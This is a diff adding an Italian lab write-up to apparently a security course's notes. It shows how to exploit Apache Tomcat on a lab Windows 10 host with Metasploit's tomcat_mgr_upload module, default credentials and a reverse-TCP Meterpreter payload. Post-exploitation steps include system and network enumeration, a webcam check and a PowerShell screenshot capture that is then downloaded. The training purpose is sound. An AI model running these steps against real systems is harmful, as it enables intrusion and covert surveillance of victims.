@@ -498,3 +498,144 @@ Sulla macchina **Metasploitable** sono stati individuati diversi servizi in asco
 ---
 ---
 
+# 🛡️ TRACCIA GIORNO 5: Exploit di Windows 10 con Metasploit
+
+## 📋 Descrizione
+Sulla macchina **Windows 10** ci sono servizi che possono essere sfruttati per ottenere una sessione Meterpreter. L'obiettivo di questa traccia è:
+1. Avviare i servizi richiesti sulla macchina target.
+2. Effettuare una scansione delle vulnerabilità con **Nessus**.
+3. Utilizzare Metasploit per exploitare il servizio **Tomcat**.
+4. Confermare l'accesso alla macchina compromessa e raccogliere evidenze:
+   - Verificare se è una macchina virtuale o fisica.
+   - Recuperare le impostazioni di rete.
+   - Controllare la presenza di webcam.
+   - Catturare uno screenshot del desktop.
+
+---
+
+## 🔧 Requisiti
+- **IP Kali Linux**: `192.168.50.165`
+- **IP Windows 10**: `192.168.50.3`
+- **Porta di ascolto (LPORT)**: `7777`
+- **Tool utilizzati**: Nessus, MSFConsole, PowerShell
+
+---
+
+## 🛠️ Passaggi Eseguiti
+
+### **1. Preparazione dei Servizi su Windows 10**
+1. Accedere alla macchina target **Windows 10** (`192.168.50.3`).
+2. Aprire `Gestione Servizi` (`services.msc`).
+3. Avviare il servizio **Apache Tomcat** (se non è già attivo).
+4. Verificare che il servizio sia in ascolto sulla porta **8080**.
+
+---
+
+### **2. Scansione delle Vulnerabilità con Nessus**
+1. Avviare il servizio Nessus su Kali Linux:
+   ```bash
+   sudo systemctl start nessusd
+   ```
+2. Accedere all'interfaccia Nessus tramite il browser: `https://localhost:8834`.
+3. Creare una nuova scansione:
+   - Tipo: **Basic Network Scan**.
+   - Target: `192.168.50.3`.
+4. Avviare la scansione e identificare le vulnerabilità relative al servizio **Tomcat**.
+
+---
+
+### **3. Exploit con Metasploit**
+
+#### **3.1 Configurazione dell'Exploit**
+1. Avviare Metasploit su Kali Linux:
+   ```bash
+   msfconsole
+   ```
+2. Cercare gli exploit disponibili per Tomcat:
+   ```bash
+   search tomcat
+   ```
+3. Selezionare l'exploit **Tomcat Manager Upload**:
+   ```bash
+   use exploit/multi/http/tomcat_mgr_upload
+   ```
+4. Configurare i parametri dell'exploit:
+   - Impostare l'IP della macchina target:
+     ```bash
+     set RHOSTS 192.168.50.3
+     set RPORT 8080
+     ```
+   - Configurare le credenziali di Tomcat:
+     ```bash
+     set HttpUsername admin
+     set HttpPassword password
+     ```
+   - Configurare il payload per la sessione Meterpreter:
+     ```bash
+     set payload java/meterpreter/reverse_tcp
+     set LHOST 192.168.50.165
+     set LPORT 7777
+     ```
+5. Lanciare l'exploit:
+   ```bash
+   exploit
+   ```
+
+---
+
+### **4. Raccolta delle Evidenze sulla Macchina Compromessa**
+
+#### **4.1 Verifica se la macchina è virtuale o fisica**
+1. Eseguire il comando:
+   ```bash
+   sysinfo
+   ```
+   - Controllare le informazioni di sistema per riferimenti a VMware, VirtualBox, o altri hypervisor.
+2. Per ulteriori verifiche, accedere alla shell:
+   ```bash
+   shell
+   ```
+   Eseguire:
+   ```cmd
+   systeminfo
+   ```
+![1](./Screenshots/MeterpreterWindows1.png)
+
+#### **4.2 Recupero delle impostazioni di rete**
+1. Tornare a Meterpreter ed eseguire:
+   ```bash
+   ipconfig
+   ```
+   - Annotare le configurazioni di rete.
+![2](./Screenshots/MeterpreterWindowsReti.png)
+
+#### **4.3 Controllo delle webcam**
+1. Questo comando non è supportato dalla sessione `java/meterpreter`. Per verificare, utilizzare la shell di Windows:
+   ```cmd
+   wmic path win32_pnpentity get name | findstr /i "camera"
+   ```
+![3](./Screenshots/MeterpreterWindowsWebcam.png)
+
+#### **4.4 Cattura di uno screenshot**
+1. Aprire **PowerShell** dalla shell di Windows:
+   ```cmd
+   powershell
+   ```
+2. Eseguire lo script per salvare uno screenshot:
+   ```powershell
+   Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size); $bmp.Save('C:\Windows\Temp\screenshot.png'); $bmp.Dispose(); $graphics.Dispose()
+   ```
+3. Tornare a Meterpreter e scaricare lo screenshot:
+   ```bash
+   download C:\Windows\Temp\screenshot.png
+   ```
+
+---
+
+## 🛠️ Conclusioni
+- Il servizio **Apache Tomcat** è stato sfruttato con successo per ottenere una sessione Meterpreter.
+- Sono state raccolte evidenze riguardo alla macchina target:
+  - Tipo di macchina (virtuale o fisica).
+  - Configurazioni di rete.
+  - Stato delle webcam.
+  - Screenshot del desktop.
